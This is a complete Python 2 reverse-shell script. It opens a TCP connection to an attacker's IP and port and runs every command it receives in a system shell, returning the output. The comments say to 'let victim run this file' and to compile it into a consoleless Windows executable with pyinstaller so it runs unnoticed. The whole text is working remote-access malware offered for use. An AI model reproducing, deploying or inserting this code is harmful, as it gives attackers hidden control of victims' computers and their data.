#/usr/bin/env python
### Use python 2
### (need to modify the ip/port in attacker_info.py)
### let victim run this file
### To convert this file to windows exe, use "pyinstaller" and run "pyinstaller --noconsole --onefile reverse_tcp.py"
import socket, subprocess, attacker_info, os
attacker_ip = attacker_info.attacker_ip      ## attacker's ip
attacker_port = attacker_info.attacker_port  ## attacker's port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   ## connect to attacker's machine
s.connect((attacker_ip, attacker_port))

while True:
    command = s.recv(1024)        # receive attacker's remote command
    if command == "exit":         # quit shell
        break
    if len(command) > 3 and command[0: 3] == "cd ": # change directory
        os.chdir(command[3:])
        s.send(" ")
        continue;

    # run command
    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = proc.stdout.read()  + proc.stderr.read()
    if len(output) == 0:
        output = " "
    s.send(output)

# done
s.close()
